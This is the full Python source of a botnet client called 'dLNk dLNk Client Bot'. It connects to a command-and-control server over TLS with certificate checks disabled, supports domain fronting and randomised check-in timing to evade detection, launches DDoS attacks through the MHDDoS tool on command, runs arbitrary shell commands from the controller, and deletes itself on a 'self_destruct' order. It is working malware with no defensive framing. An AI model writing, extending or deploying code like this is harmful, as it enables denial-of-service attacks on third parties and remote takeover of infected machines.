import socket
import subprocess
import time
import argparse
import os
import json
import ssl
import random


def execute_attack(command):
    """Executes the received attack command."""
    print(f"[BOT] Received attack command: {command}")
    try:
        mhddos_path = os.path.join("..", "tools", "MHDDoS")
        if not os.path.exists(mhddos_path):
            print(f"[BOT] MHDDoS tool not found at {mhddos_path}")
            return {"status": "error", "output": "MHDDoS not found."}

        full_command = f"python3 {os.path.join(mhddos_path, 'start.py')} {command}"
        print(f"[BOT] Executing full command: {full_command}")

        process = subprocess.Popen(
            full_command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=mhddos_path
        )
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            print("[BOT] Attack command finished successfully.")
            return {"status": "success", "output": stdout.decode('utf-8', errors='ignore')}
        else:
            print(
                f"[BOT] Attack command failed with error: {stderr.decode('utf-8', errors='ignore')}")
            return {"status": "error", "output": stderr.decode('utf-8', errors='ignore')}

    except Exception as e:
        print(f"[BOT] Exception during command execution: {e}")
        return {"status": "error", "output": str(e)}


def main(c2_host, c2_port, fronting_host, host_header, sleep_interval, jitter):
    """Main loop to connect to C2 and listen for commands."""
    # --- Domain Fronting Logic ---
    connection_host = fronting_host if fronting_host else c2_host
    sni_host = host_header if host_header else c2_host

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            print(
                f"[BOT] Attempting to connect to {connection_host}:{c2_port} (SNI: {sni_host})...")
            with socket.create_connection((connection_host, c2_port)) as sock:
                with context.wrap_socket(sock, server_hostname=sni_host) as ssock:
                    print("[BOT] Connected securely to C2 server.")

                    while True:
                        data = ssock.recv(4096).decode(
                            'utf-8', errors='ignore')
                        if not data:
                            break

                        try:
                            command_data = json.loads(data)
                            command = command_data.get("command")
                            payload = command_data.get("payload")

                            print(f"[BOT] Received command: {command}")

                            response = {"status": "acknowledged"}
                            if command == "ping":
                                response = {"status": "pong"}
                            elif command == "attack":
                                if payload:
                                    result = execute_attack(payload)
                                    response = {
                                        "status": "attack_result", "result": result}
                                else:
                                    response = {
                                        "status": "error", "output": "No payload for attack command"}
                            elif command == "execute_shell":
                                if payload:
                                    try:
                                        shell_output = subprocess.check_output(
                                            payload, shell=True, stderr=subprocess.STDOUT)
                                        response = {"status": "shell_success", "output": shell_output.decode(
                                            'utf-8', errors='ignore')}
                                    except Exception as e:
                                        response = {
                                            "status": "shell_error", "output": str(e)}
                                else:
                                    response = {
                                        "status": "error", "output": "No payload for shell command"}
                            elif command == "self_destruct":
                                response = {"status": "self_destructing"}
                                ssock.sendall(json.dumps(
                                    response).encode('utf-8'))
                                os.remove(__file__)
                                break
                            elif command == "update":
                                response = {"status": "update_acknowledged",
                                            "output": "Update feature not yet implemented."}

                            ssock.sendall(json.dumps(response).encode('utf-8'))

                        except json.JSONDecodeError:
                            print(f"[BOT] Received non-JSON data: {data}")
                        except Exception as e:
                            print(f"[BOT] Error processing command: {e}")
                            response = {"status": "error", "output": str(e)}
                            ssock.sendall(json.dumps(response).encode('utf-8'))

        except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError, ssl.SSLError) as e:
            jitter_amount = sleep_interval * jitter
            total_sleep = sleep_interval + \
                random.uniform(-jitter_amount, jitter_amount)
            print(
                f"[BOT] Connection to C2 failed or was lost ({type(e).__name__}). Reconnecting in {total_sleep:.2f} seconds...")
            time.sleep(total_sleep)
        except Exception as e:
            jitter_amount = sleep_interval * jitter
            total_sleep = sleep_interval + \
                random.uniform(-jitter_amount, jitter_amount)
            print(
                f"[BOT] An unexpected error occurred: {e}. Retrying in {total_sleep:.2f} seconds...")
            time.sleep(total_sleep)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="dLNk dLNk Client Bot")
    parser.add_argument("--host", default="127.0.0.1", help="C2 server host")
    parser.add_argument("--port", type=int, default=4444,
                        help="C2 server port")
    parser.add_argument("--fronting-host", default=None,
                        help="The high-reputation domain to connect to (for domain fronting).")
    parser.add_argument("--host-header", default=None,
                        help="The real Host header / SNI value for the C2 server.")
    parser.add_argument("--sleep", type=float, default=10.0,
                        help="Base sleep time in seconds for C2 check-in.")
    parser.add_argument("--jitter", type=float, default=0.5,
                        help="Jitter percentage (0.0 to 1.0) to randomize sleep time.")
    args = parser.parse_args()

    main(args.host, args.port, args.fronting_host,
         args.host_header, args.sleep, args.jitter)
